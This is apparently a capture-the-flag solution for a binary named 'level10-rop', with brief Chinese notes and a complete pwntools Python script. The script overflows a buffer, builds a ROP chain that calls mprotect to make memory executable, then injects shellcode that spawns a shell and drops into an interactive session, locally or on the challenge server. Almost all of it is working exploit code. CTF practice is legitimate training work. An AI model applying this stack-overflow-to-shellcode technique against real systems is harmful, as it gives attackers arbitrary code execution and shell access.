# level10-rop

##### 通过mprotect系统调用，开启一段rwx的内存权限，将shellcode注入后跳转执行
##### 利用好给出的,pop eax;pop ebx;pop ecx; pop edx; int 80 ret;gadget
##### 注意：mprotect只能开启已经在内存中的段的权限，应先用gdb查看各内存段的位置

```python
from pwn import *
context.log_level="debug"
pwn_file="./level10-rop"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22010)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

say1= r.recv()

inject_addr = 0x8048000
start_func = 0x804813A
read_sth = 0x80480FD

pop_eax = 0x804819C
pop_ebx = 0x804819E
pop_ecx = 0x80481A0
pop_edx = 0x80481A2

eax_val = 0x7d 
ebx_val = inject_addr
ecx_val = 0x1000
edx_val = 7
int_80 = 0x80481a4 

run_addr = inject_addr + 0x500
sh = asm(shellcraft.sh())

payload_m = 'a'*0x30
payload_m += p32(pop_eax) + p32(eax_val)
payload_m += p32(pop_ebx) + p32(ebx_val)
payload_m += p32(pop_ecx) + p32(ecx_val)
payload_m += p32(pop_edx) + p32(edx_val)
payload_m += p32(int_80)  + p32(read_sth) + p32(run_addr) + p32(0) + p32(run_addr) +p32(0x80)

r.sendline(payload_m)
r.recv()
r.sendline(sh)

payload_test = 'a'*0x30+p32(0x08048115) +p32(0)+ p32(1) + p32(0xffffd42c) +p32(4)
r.interactive()
```
